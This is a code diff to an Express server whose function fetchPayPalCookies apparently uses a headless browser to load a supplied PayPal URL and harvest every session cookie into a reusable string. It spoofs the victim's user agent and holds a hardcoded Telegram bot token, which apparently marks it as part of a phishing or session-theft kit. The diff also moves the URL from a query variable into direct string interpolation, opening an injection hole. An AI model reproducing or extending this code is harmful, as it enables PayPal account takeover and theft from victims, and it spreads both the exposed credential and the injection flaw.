@@ -1,4 +1,5 @@
 const express = require('express');
+const fetch = require('node-fetch'); // Ensure node-fetch is installed
 const app = express();
 const port = process.env.PORT || 3000;
 const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
@@ -61,20 +62,23 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
     const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
     const query = `
-        mutation Goto($url: String!) {
-            goto(url: $url, waitUntil: networkIdle) {
+        mutation {
+            goto(url: "${paypalUrl}", waitUntil: networkIdle) {
                 status
             }
             cookies {
-                name
-                value
-                domain
-                path
-                secure
-                httpOnly
-                sameSite
-                expires
-                url
+                cookies {
+                    name
+                    value
+                    domain
+                    path
+                    secure
+                    httpOnly
+                    sameSite
+                    expires
+                    url
+                }
+                time
             }
         }
     `;
@@ -85,10 +89,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
             headers: {
                 "Content-Type": "application/json",
             },
-            body: JSON.stringify({
-                query,
-                variables: { url: paypalUrl }
-            })
+            body: JSON.stringify({ query })
         });
 
         const data = await response.json();
@@ -96,10 +97,10 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
             throw new Error(data.errors[0].message);
         }
 
-        const cookies = data.data.cookies;
+        const cookieResponse = data.data.cookies;
         let cookieString = "";
-        if (Array.isArray(cookies)) {
-            cookies.forEach(cookie => {
+        if (cookieResponse && Array.isArray(cookieResponse.cookies)) {
+            cookieResponse.cookies.forEach(cookie => {
                 if (cookie.name && cookie.value) {
                     cookieString += `${cookie.name}=${cookie.value}; `;
                 }
